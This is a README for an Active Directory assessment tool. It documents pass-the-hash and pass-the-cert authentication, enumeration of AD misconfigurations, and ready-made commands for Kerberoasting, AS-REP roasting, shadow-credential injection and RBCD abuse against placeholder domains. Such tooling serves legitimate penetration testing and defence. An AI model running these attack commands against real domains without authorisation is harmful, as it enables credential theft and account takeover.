# Maul

Active Directory privilege escalation assessment tool for Linux, built on impacket, ldap3, and certipy.

```
maul enum -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10
```

---

## Install

From GitHub (recommended):
```bash
pipx install git+https://github.com/Zer0Xfr/Maul.git
```

From a local clone:
```bash
git clone https://github.com/Zer0Xfr/Maul.git
cd Maul
pipx install .
```

With pip in a venv:
```bash
git clone https://github.com/Zer0Xfr/Maul.git
cd Maul
python3 -m venv .venv
source .venv/bin/activate
pip install .
```

Python 3.10+ required. Dependencies install automatically: impacket, ldap3, certipy-ad, rich, jinja2, pycryptodome, dnspython, argcomplete.

Optional shell completion:

```bash
register-python-argcomplete maul >> ~/.bashrc
```

---

## Quick Start

```bash
# Password auth
maul enum -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10

# Pass-the-hash
maul enum -d corp.local -u jdoe -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --dc 192.168.1.10

# Kerberos (ccache)
KRB5CCNAME=jdoe.ccache maul enum -d corp.local -u jdoe -k --dc 192.168.1.10

# Certificate (PKINIT)
maul enum -d corp.local -u jdoe --pfx jdoe.pfx --pfx-pass secret --dc 192.168.1.10

# Pass-the-Cert (LDAPS Schannel)
maul enum -d corp.local --pfx jdoe.pfx --pass-the-cert --dc 192.168.1.10

# LDAPS
maul enum -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --ldaps
```

---

## Authentication Methods

| Flag | Method |
|------|--------|
| `-p PASSWORD` | Plaintext password (NTLM or Kerberos) |
| `-H HASH` | Pass-the-hash (NTLM) |
| `-k / --kerberos` | Kerberos (uses `KRB5CCNAME` ccache) |
| `--pfx FILE [--pfx-pass P]` | PKINIT (certificate → TGT) |
| `--pfx FILE --pass-the-cert` | Pass-the-Cert (LDAPS Schannel) |
| `--aes-key KEY` | AES-128/256 Kerberos key |

---

## Commands

| Command | What it does |
|---------|-------------|
| `enum` | Run enumeration modules against a target domain |
| `kerberoast` | Request and dump Kerberoastable TGS hashes |
| `asreproast` | Dump AS-REP roastable hashes |
| `shadow-creds` | Shadow credentials attack |
| `rbcd` | Resource-based constrained delegation abuse |
| `report` | Report utilities — convert formats, diff scans |

Run `maul <command> --help` for command-specific options.

---

## Modules

Modules run under `maul enum`. All modules run by default; use `-M` to select specific ones:

```bash
# All modules
maul enum -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10

# Specific modules
maul enum -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 -M adcs,rights,delegation
```

| Module | What it finds |
|--------|--------------|
| `domain` | Domain info, functional level, trusts, password policy, LDAP/SMB signing |
| `creds` | Kerberoastable SPNs, AS-REP roastable, SYSVOL creds, gMSA, LAPS |
| `rights` | DCSync, dangerous ACLs, WriteDACL, WriteOwner, GenericAll |
| `delegation` | Unconstrained, constrained, RBCD |
| `adcs` | Certificate template vulns — ESC1 through ESC16 |
| `accounts` | Privileged users, adminCount, SID history, stale accounts |
| `gpo` | GPO write access, local group membership via GPO |
| `computer` | LAPS coverage, outdated OS, infrastructure servers |
| `application` | Exchange, SCCM, SCOM detection |

List all modules with opsec status:

```bash
maul enum --list-modules  # or: maul enum -L
```

---

## Offensive Commands

Standalone attack commands — these are NOT modules, they run directly:

```bash
# Kerberoast
maul kerberoast -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 -o hashes.txt
maul kerberoast -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --rc4-only -o hashes.txt

# AS-REP Roast
maul asreproast -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 -o hashes.txt

# Shadow Credentials
maul shadow-creds -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --target victim$ --action add
maul shadow-creds -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --target victim$ --action list
maul shadow-creds -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --target victim$ --action remove --device-id <guid>

# RBCD abuse
maul rbcd -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --target target$ --action read
maul rbcd -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --target target$ --action write --delegate-from controlled$
maul rbcd -d corp.local -u jdoe -p 'P@ssw0rd' --dc 192.168.1.10 --target target$ --action remove
```

---

## Output Formats

By default findings are printed to the console. Use `-o / --output` to save reports:

```bash
maul enum ... -o report          # writes report.json, report.html, report.txt
maul enum ... -o report -f json  # JSON only
maul enum ... -o report -f html  # HTML only
maul enum ... -o report -f txt   # plain text only
```

### Diff / Delta Reports

Compare two JSON reports to track new and resolved findings:

```bash
maul report diff --baseline baseline.json --current current.json --output delta
maul report convert --input report.json --output report -f html
```

---

## Filtering

```bash
# Only show HIGH and CRITICAL findings (default: LOW and above)
maul enum ... --min-severity high

# Verbose: include INFO findings
maul enum ... -v

# Filter to specific modules
maul enum ... -M adcs,rights,delegation
```

Severity levels (ascending): `INFO` → `LOW` → `MEDIUM` → `HIGH` → `CRITICAL`

---

## Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Completed successfully, no HIGH or CRITICAL findings |
| `1` | Completed successfully, at least one HIGH or CRITICAL finding found |
| `2` | Authentication failure |
| `3` | Connection / network failure |

Useful for scripted pipelines:

```bash
maul enum ... && echo "Clean" || echo "Findings require attention"
```

---

## Full Options Reference

```
maul enum [options]

Required:
  -d, --domain DOMAIN       Target domain (e.g. corp.local)

Authentication (one required):
  -u, --username USER
  -p, --password PASS
  -H, --hashes HASH         LM:NT or just NT hash
  -k, --kerberos            Use Kerberos (KRB5CCNAME must be set)
  --pfx FILE                PFX/P12 certificate file
  --pfx-pass PASS           Password for PFX file
  --pass-the-cert           Use PFX for LDAPS Schannel (Pass-the-Cert)
  --aes-key KEY             AES-128/256 Kerberos key

Connection:
  --dc IP/HOST              Domain controller (auto-discovered via DNS SRV if omitted)
  --dns DNS                 DNS server for DC SRV discovery
  --ldaps                   Use LDAPS (port 636) instead of LDAP (port 389)
  --kdcHost HOST            KDC host for Kerberos (defaults to --dc)
  --timeout SEC             Connection timeout in seconds (default: 30)

Output:
  -o, --output FILE         Output file base name (.json/.html/.txt)
  -f, --format FMT          Output format: all (default), html, json, txt
  --min-severity LEVEL      Minimum severity to display [info/low/medium/high/critical]
  -L, --list-modules        List available modules and exit
  -v, --verbose             Include INFO-level findings

Modules:
  -M, --modules MODS        Comma-separated list of modules to run (default: all)
  --opsec                   Skip noisy checks
```

---

## Development

```bash
pip install -e ".[dev]"
pytest tests/ -q
ruff check maul/
```

---

## Credits

Built on [impacket](https://github.com/fortra/impacket), [certipy](https://github.com/ly4k/Certipy), [ldap3](https://github.com/cannatag/ldap3), and [BloodHound.py](https://github.com/dirkjanm/BloodHound.py).
